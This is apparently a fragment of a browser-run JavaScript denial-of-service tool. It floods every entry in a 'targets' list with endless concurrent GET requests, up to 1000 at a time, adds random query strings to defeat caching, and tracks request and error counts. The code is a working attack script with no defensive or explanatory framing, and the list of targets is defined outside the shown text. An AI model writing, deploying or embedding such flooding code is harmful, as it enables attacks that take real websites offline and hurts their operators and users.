
var targetStats = {}
targets.forEach((target) => {
    targetStats[target] = {number_of_requests: 0, number_of_errored_responses: 0}
})

setInterval(printStats, 1000);

var CONCURRENCY_LIMIT = 1000
var queue = []

async function fetchWithTimeout(resource, options) {
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), options.timeout);
    return fetch(resource, {
        method: 'GET',
        mode: 'no-cors',
        signal: controller.signal
    }).then((response) => {
        clearTimeout(id);
        return response;
    }).catch((error) => {
        clearTimeout(id);
        throw error;
    });
}

async function flood(target) {
    for (var i = 0;; ++i) {
        if (queue.length > CONCURRENCY_LIMIT) {
            await queue.shift()
        }
        let rand = i % 3 === 0 ? '' : ('?' + Math.random() * 1000)
        queue.push(
            fetchWithTimeout(target+rand, {timeout: 1000})
                .catch((error) => {
                    if (error.code === 20 /* ABORT */) {
                        return;
                    }
                    targetStats[target].number_of_errored_responses++;
                })
                .then((response) => {
                    if (response && !response.ok) {
                        targetStats[target].number_of_errored_responses++;
                    }
                    targetStats[target].number_of_requests++;
                })

        )
    }
}

// Start
targets.map(flood)